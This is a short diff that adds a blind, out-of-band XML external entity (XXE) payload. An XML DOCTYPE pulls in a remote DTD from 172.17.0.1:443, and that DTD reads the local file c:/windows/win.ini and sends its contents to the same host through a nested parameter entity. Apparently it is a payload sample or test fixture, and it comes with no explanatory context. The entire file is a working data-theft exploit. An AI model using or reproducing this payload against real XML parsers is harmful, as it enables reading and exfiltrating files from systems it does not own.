@@ -1,0 +1,13 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+        <!ELEMENT r ANY >
+        <!ENTITY % sp SYSTEM "http://172.17.0.1:443/ev.xml">
+        %sp;
+        %param1;
+        %exfil;
+        ]>
+
+        ## External dtd: ##
+
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://172.17.0.1:443/?%data;'>">
